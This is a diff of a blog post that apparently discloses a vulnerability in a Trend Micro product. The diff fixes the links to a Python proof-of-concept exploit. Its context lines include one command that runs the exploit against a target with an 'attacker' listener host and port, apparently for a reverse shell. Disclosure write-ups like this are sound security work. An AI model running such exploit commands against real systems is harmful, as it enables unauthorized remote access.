@@ -100,7 +100,7 @@ def handle_certificate(self, pfx_file, password):
 {% endhighlight %}
 
 
-I wrote the initial proof-of-concept using Python. You can get the code from [here]({{site.url}}assets/exploit_vmi.py).
+I wrote the initial proof-of-concept using Python. You can get the code from [here]({{site.url}}/assets/exploit_vmi.py).
 
 ```
 python exploit.py --rhost vmi --rport 8443 --lhost attacker --lport 4444 --username admin --password admin
@@ -145,5 +145,5 @@ Once again, Trend Micro vulnerability team was great in handling this coordinate
 
 ### Exploit
 
-* [Python PoC]({{site.url}}assets/exploit_vmi.py)
+* [Python PoC]({{site.url}}/assets/exploit_vmi.py)
 * Metasploit module - Will push it by this evening :)
